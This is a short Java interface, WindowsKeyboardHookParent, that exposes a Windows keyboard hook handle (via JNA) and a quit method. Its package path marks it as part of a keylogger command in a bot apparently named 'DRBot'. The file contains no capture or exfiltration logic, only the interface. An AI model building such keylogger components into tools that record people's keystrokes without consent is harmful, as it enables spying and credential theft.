package com.DRBot.Commands.keyLogger.keyLog;
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

import com.sun.jna.platform.win32.WinUser.HHOOK;

public interface WindowsKeyboardHookParent {
    public HHOOK getHHOOK();

    public void quit();
}
